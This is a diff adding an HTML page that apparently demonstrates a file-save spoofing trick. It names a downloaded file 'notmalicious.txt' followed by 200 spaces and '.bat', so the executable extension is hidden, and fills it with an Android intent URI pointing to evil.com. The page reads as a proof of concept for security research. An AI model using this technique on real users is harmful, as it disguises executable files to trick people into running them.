@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>File System API + Fallback for Android</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+</head>
+
+<body>
+  <h3>File Save: Obfuscated Extension (.txt + space + .bat)</h3>
+  <button onclick="saveFile()" style="font-size: 26px; margin-top: 10px;">Save File</button>
+
+  <script>
+    async function saveFile() {
+      const fileName = 'notmalicious.txt' + ' '.repeat(200) + '.bat';
+      const fileContent = 'intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end';
+      const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+
+      const isAndroid = /android/i.test(navigator.userAgent);
+      const hasFSAccess = 'showSaveFilePicker' in window;
+
+      if (!isAndroid && hasFSAccess) {
+        // DESKTOP: Use File System Access API
+        try {
+          const handle = await window.showSaveFilePicker({
+            suggestedName: fileName,
+            types: [{
+              description: 'Text file',
+              accept: { 'text/plain': ['.bat'] }
+            }]
+          });
+          const writable = await handle.createWritable();
+          await writable.write(fileBlob);
+          await writable.close();
+          alert('File saved using File System Access API.');
+        } catch (e) {
+          console.warn('Error saving file:', e);
+        }
+      } else {
+        // ANDROID or fallback: Use FileSaver.js
+        saveAs(fileBlob, fileName);
+        alert('File saved using fallback method (FileSaver.js).');
+      }
+    }
+  </script>
+</body>
+</html>
